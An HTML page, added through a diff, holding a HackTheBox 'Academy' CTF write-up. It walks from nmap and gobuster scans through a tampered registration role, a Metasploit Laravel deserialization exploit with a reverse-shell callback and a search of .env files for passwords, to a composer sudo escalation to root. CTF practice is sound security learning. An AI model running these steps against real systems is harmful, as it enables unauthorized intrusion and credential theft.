@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Writeup of Academy Box in HTB">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Academy HacktheBox Writeup"/>
+<meta name="twitter:description" content="Writeup of Academy Box in HTB"/>
+
+    <meta property="og:title" content="Academy HacktheBox Writeup" />
+<meta property="og:description" content="Writeup of Academy Box in HTB" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/academy/" />
+<meta property="article:published_time" content="2021-01-21T23:29:18+05:30" />
+<meta property="article:modified_time" content="2021-01-21T23:29:18+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/doctor/" />
+
+
+
+    <title>
+  Academy HacktheBox Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/hackthebox/academy/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Academy HacktheBox Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-01-21T23:29:18&#43;05:30'>
+                January 21, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              4-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/hackthebox/">HackTheBox</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/hackthebox/">hackthebox</a>
+      <span class="separator">•</span>
+    <a href="/tags/easy_box/">easy_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="academyhttpsapphacktheboxeumachines297-hackthebox-writeup"><a href="https://app.hackthebox.eu/machines/297">Academy</a> HackTheBox Writeup</h1>
+<p><img src="/HackTheBox/Academy/BoxImage.webp" alt=""></p>
+<h2 id="first-stage--enumeration">First Stage : Enumeration</h2>
+<p>Let&rsquo;s fire up nmap.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Wed Jan 20 12:32:23 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.10.215
+Warning: 10.10.10.215 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.10.215
+Host is up, received syn-ack (0.24s latency).
+Scanned at 2021-01-20 12:32:25 IST for 2473s
+Not shown: 64541 closed ports, 991 filtered ports
+Reason: 64541 conn-refused and 991 no-responses
+PORT      STATE SERVICE REASON  VERSION
+22/tcp    open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/0BA3dU0ygKCvP7G3GklCeOqxb17vxMCsugN05RA9Fhj7AzkPiMLrrKRY656gBuscH23utAWAhRXzV1SyU37bbFzEbfaqYAlh1ggHEuluLgbf9QsYZe76zCx2SRPOzoI9Q40klVvuu9E92pNLe80dvUZj644EwhJTGw4KGxeOqeuo/nXnYfiNAbWvOe9Qp+djDbEvP5lHwIDMTAtgggoSC1chubC3jFC4hihuYjtitjUr4+5fROomhJAo/GEvdBj2CYNHIFEvmuvb32cgul5ENQS4fJXpcI7fbP9/+b/cfA9oRxG2k+k1M8mUld2h5mHEVBE5Z9WKS3cRYu97oVKnRRCoDY/55mZw6lngIdH4drpYwzCrZcCWgviXRfCeOwmZ8sucap6qN/nFYnPoF7fd+LGaQOhz9MkAZCTMmLqSiZGSistAIPzHtABH0VQDbo2TqJ+kGWr9/EamCcYBbVVPaFj/XQqujoEjLYW+igihwrPEQ7zxlleQHwg91oSVy38=
+|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAIMsz8qKL1UCyrPmpM5iTmoy3cOsk+4L7oFdcPjBXwAcUVvnti7nXHlNqMfgsapbGSIl7AWTOeXLZmw2J6JWvE=
+|   256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBP1E2rWeTShvyJKxC5Brv1Do3OwvWIzlZHWVw/bD0R
+80/tcp    open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://academy.htb/
+33060/tcp open  mysqlx? syn-ack
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message&#34;
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.91%I=7%D=1/20%Time=6007DF06%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(GenericLines,9,&#34;\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0&#34;)%r(GetRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(HTTPOp
+SF:tions,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(RTSPRequest,9,&#34;\x05\0\0\0\x0b
+SF:\x08\x05\x1a\0&#34;)%r(RPCCheck,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNSVers
+SF:ionBindReqTCP,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(DNSStatusRequestTCP,2
+SF:B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fI
+SF:nvalid\x20message\&#34;\x05HY000&#34;)%r(Help,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)
+SF:%r(SSLSessionReq,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01
+SF:\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000&#34;)%r(TerminalServerCookie
+SF:,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(TLSSessionReq,2B,&#34;\x05\0\0\0\x0b\x
+SF:08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;
+SF:\x05HY000&#34;)%r(Kerberos,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SMBProgNeg,9
+SF:,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(X11Probe,2B,&#34;\x05\0\0\0\x0b\x08\x05\
+SF:x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY0
+SF:00&#34;)%r(FourOhFourRequest,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LPDString,
+SF:9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LDAPSearchReq,2B,&#34;\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\
+SF:x05HY000&#34;)%r(LDAPBindReq,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(SIPOptions
+SF:,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(LANDesk-RC,9,&#34;\x05\0\0\0\x0b\x08\x
+SF:05\x1a\0&#34;)%r(TerminalServer,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(NCP,9,&#34;
+SF:\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(NotesRPC,2B,&#34;\x05\0\0\0\x0b\x08\x05\x1
+SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\x05HY000
+SF:&#34;)%r(JavaRMI,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(WMSRequest,9,&#34;\x05\0\0
+SF:\0\x0b\x08\x05\x1a\0&#34;)%r(oracle-tns,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r
+SF:(ms-sql-s,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;)%r(afp,2B,&#34;\x05\0\0\0\x0b\x0
+SF:8\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88&#39;\x1a\x0fInvalid\x20message\&#34;\
+SF:x05HY000&#34;)%r(giop,9,&#34;\x05\0\0\0\x0b\x08\x05\x1a\0&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Jan 20 13:13:38 2021 -- 1 IP address (1 host up) scanned in 2475.13 seconds
+</code></pre></div><p>Hence the open ports are:</p>
+<ul>
+<li>22</li>
+<li>80</li>
+<li>33060</li>
+</ul>
+<p>So it seems like port 80 is our way in.</p>
+<p>Let&rsquo;s visit it .</p>
+<h3 id="note--add-academyhtb-boxip-in-etchosts-file">Note : add academy.htb Boxip in /etc/hosts file</h3>
+<p><img src="/HackTheBox/Academy/port80.png" alt=""></p>
+<p>Hence Let&rsquo;s fire up gobuster to find hidden directories.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://academy.htb/
+[+] Threads:        50
+[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     txt,html,php
+[+] Timeout:        10s
+===============================================================
+2021/01/20 12:34:34 Starting gobuster
+===============================================================
+/register.php (Status: 200)
+/admin.php (Status: 200)
+/home.php (Status: 302)
+/config.php (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2021/01/20 13:46:20 Finished
+===============================================================
+===============================================================
+</code></pre></div><p>So we have an interesting directory <strong>admin.php</strong></p>
+<p>As I was seeing source code of every page , register.php caught my eye.</p>
+<p>So let&rsquo;s fire up burpsuite.</p>
+<p>Hence while registering I intercepted the request.</p>
+<p><img src="/HackTheBox/Academy/original.png" alt=""></p>
+<p>I changed the roleid to 1 and forwarded I got to .</p>
+<p><img src="/HackTheBox/Academy/success.png" alt=""></p>
+<p>Afterwards we are redirected to login.php.</p>
+<p>Hence I try this credentials on admin.php and <strong>boom</strong> it worked !</p>
+<p>So I after I login I see this strange subdomain.</p>
+<p><img src="/HackTheBox/Academy/admin.png" alt=""></p>
+<p>Hence we visit that subdomain after adding it to /etc/hosts.</p>
+<p><img src="/HackTheBox/Academy/subdomain.png" alt=""></p>
+<p>Hence we see the app name is <strong>Laravel</strong>.</p>
+<p>So maybe this might have a public exploit.</p>
+<h2 id="second-stage--initial-access-as-www-data">Second Stage : Initial access as www-data</h2>
+<p>After searching we see that there is a <a href="https://www.rapid7.com/db/modules/exploit/unix/http/laravel_token_unserialize_exec/">metasploit module</a>.</p>
+<p>Before we exploit let&rsquo;s understand what is the vulnerability and how it is exploited.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">This module exploits a vulnerability in the PHP Laravel Framework for versions 5.5.40, 5.6.x &lt;= 5.6.29. Remote Command Execution is possible via a correctly formatted HTTP X-XSRF-TOKEN header, due to an insecure unserialize call of the decrypt method in Illuminate/Encryption/Encrypter.php. Authentication is not required, however exploitation requires knowledge of the Laravel APP_KEY. Similar vulnerabilities appear to exist within Laravel cookie tokens based on the code fix. In some cases the APP_KEY is leaked which allows for discovery and exploitation.
+</code></pre></div><p>So let&rsquo;s fire up metasploit.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">use exploit/unix/http/laravel_token_unserialize_exec
+
+<span style="color:#fff;font-weight:bold">set</span> LHOST tun0
+
+<span style="color:#fff;font-weight:bold">set</span> APP_KEY &lt;app-key&gt;
+
+<span style="color:#fff;font-weight:bold">set</span> RHOSTS &lt;box-ip&gt;
+
+<span style="color:#fff;font-weight:bold">set</span> VHOST &lt;redacted&gt;.academy.htb
+
+run
+</code></pre></div><p>Since metasploit session may die , let&rsquo;s use reverse shell and get a proper shell.</p>
+<p><img src="/HackTheBox/Academy/www-data.png" alt=""></p>
+<h2 id="third-stage--www-data-to-cry0l1t3">Third Stage : www-data to cry0l1t3</h2>
+<p>So we need to find which user we want to escalate as.</p>
+<p><img src="/HackTheBox/Academy/whichuser.png" alt=""></p>
+<p>So the user cry0l1t3 has the user flag so let&rsquo;s aim for that user.</p>
+<p>I ran linpeas but got no password , maybe I was not looking closely . Then I searched important files of Laravel . I got to know that <strong>.env</strong> files have sensitive information.</p>
+<p>Hence I did this search .</p>
+<blockquote>
+<p>find / -type f -name .env 2&raquo;/dev/null</p>
+</blockquote>
+<p><img src="/HackTheBox/Academy/envfiles.png" alt=""></p>
+<p>Hence I opened the first file.</p>
+<p><img src="/HackTheBox/Academy/userpassword.png" alt=""></p>
+<p>I used this for cry0l1t3 and it worked.</p>
+<h2 id="fourth-stage--cry0l1t3-to-mrb3n">Fourth Stage : cry0l1t3 to mrb3n</h2>
+<p>Let&rsquo;s ssh using the passsword we got.</p>
+<p>Use <strong>/bin/bash -p</strong> to get a proper bash shell.</p>
+<p>So I ran linpeas as usual.</p>
+<p>And as I was reading through the results I found this.</p>
+<p><img src="/HackTheBox/Academy/mrb3n.png" alt=""></p>
+<p>So we get user mrb3n&rsquo;s password</p>
+<h2 id="fifth-stage--mrb3n-to-root">Fifth Stage : mrb3n to root</h2>
+<p>As soon as I got in as mrb3n I tried</p>
+<blockquote>
+<p>sudo -l</p>
+</blockquote>
+<p><img src="/HackTheBox/Academy/perms.png" alt=""></p>
+<p>Hence I went to <a href="https://gtfobins.github.io/">GTFOBins</a></p>
+<p>And searched for composer.</p>
+<p>And steps to escalate are as follows</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">TF=<span style="color:#fff;font-weight:bold">$(</span>mktemp -d<span style="color:#fff;font-weight:bold">)</span>
+<span style="color:#fff;font-weight:bold">echo</span> <span style="color:#0ff;font-weight:bold">&#39;{&#34;scripts&#34;:{&#34;x&#34;:&#34;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&#34;}}&#39;</span> &gt;$TF/composer.json
+sudo /usr/bin/composer --working-dir=$TF run-script x
+</code></pre></div><p><img src="/HackTheBox/Academy/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in HackTheBox</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/hackthebox/doctor/">Doctor HacktheBox Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
